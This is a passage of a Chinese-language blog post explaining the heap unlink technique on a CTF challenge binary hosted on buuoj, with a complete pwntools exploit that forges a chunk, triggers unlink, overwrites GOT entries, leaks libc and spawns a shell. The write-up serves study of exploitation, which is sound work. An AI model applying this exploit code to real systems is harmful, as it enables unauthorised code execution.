+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>)<span class="comment"># 1</span></span><br><span class="line">   </span><br><span class="line">p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment"># 3</span></span><br><span class="line">   </span><br><span class="line">p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment"># 4</span></span><br></pre></td></tr></table></figure>
+
+<p>然后通过edit第二个堆块来<strong>制造fack chunk并溢出到第三个堆块，修改他的prev_size和prev_inuse</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chunks =  <span class="number">0x602140</span></span><br><span class="line">aim = chunks + <span class="number">0x10</span><span class="comment">#chunk2_addr</span></span><br><span class="line">fd = aim - <span class="number">0x18</span></span><br><span class="line">bk = aim - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake_chunk</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">payload1 = p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>) + p64(fd) + p64(bk) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x90</span>,payload1)</span><br></pre></td></tr></table></figure>
+<p>此时，chunk2内存是这样的<br><img src="/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011501083.png" alt="image-20250617011501083"></p>
+<p>接着<strong>free第三个堆块触发unlink</strong>，这个时候原来存放第二个堆块的指针(list[2])的位置就被写入了 <strong>&amp;list -0x8</strong><br><img src="/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011508665.png" alt="image-20250617011508665"></p>
+<p>后面我们就可以通过edit堆块2去修改list中存放的值，我们将chunk_list[1]、chunk_list[2]、chunk_list[3]的值分别改为free、puts、atoi的got表地址<br>然后通过edit堆块1，实现修改free_got为 puts_plt ，然后free堆块2就能泄露puts函数的真实地址，据此算出libc_base<br>然后edit堆块3将atoi_got改为system的地址，最后输入<code>/bin/sh</code>就能getshell</p>
+<p>完整的exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span> , os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">is_remote = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (remote):</span><br><span class="line">    p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">26221</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(pwnfile)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choicce</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choicce).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    chunks =  <span class="number">0x602140</span></span><br><span class="line">    aim = chunks + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    fd = aim - <span class="number">0x18</span></span><br><span class="line">    bk = aim - <span class="number">0x10</span></span><br><span class="line">    </span><br><span class="line">    puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">    fread_got = elf.got[<span class="string">&#x27;fread&#x27;</span>]</span><br><span class="line">    puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x80</span>)<span class="comment">#</span></span><br><span class="line">   </span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x80</span>)<span class="comment">#</span></span><br><span class="line">    </span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x80</span>)<span class="comment">#</span></span><br><span class="line">   </span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>)<span class="comment"># </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment">#fake_chunk</span></span><br><span class="line">    </span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">    payload1 = p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>) + p64(fd) + p64(bk) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">    edit(<span class="number">2</span>,<span class="number">0x90</span>,payload1)</span><br><span class="line">    </span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">    payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(free_got) + p64(puts_got) + p64(atoi_got) </span><br><span class="line">    edit( <span class="number">2</span> , <span class="built_in">len</span>(payload2) , payload2)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">    edit( <span class="number">1</span> , <span class="number">0x8</span> , p64(puts_plt))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    success(<span class="string">&quot;puts_addr: &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    success(<span class="string">&quot;system_addr: &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">    edit( <span class="number">3</span> , <span class="number">0x8</span> , p64(system_addr))</span><br><span class="line">    </span><br><span class="line">    pause()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/heap/" rel="tag"># heap</a>
+              <a href="/tags/unlink/" rel="tag"># unlink</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/06/17/hello-world/" rel="prev" title="Hello World">
+                  <i class="fa fa-angle-left"></i> Hello World
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Fa1lSnow</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
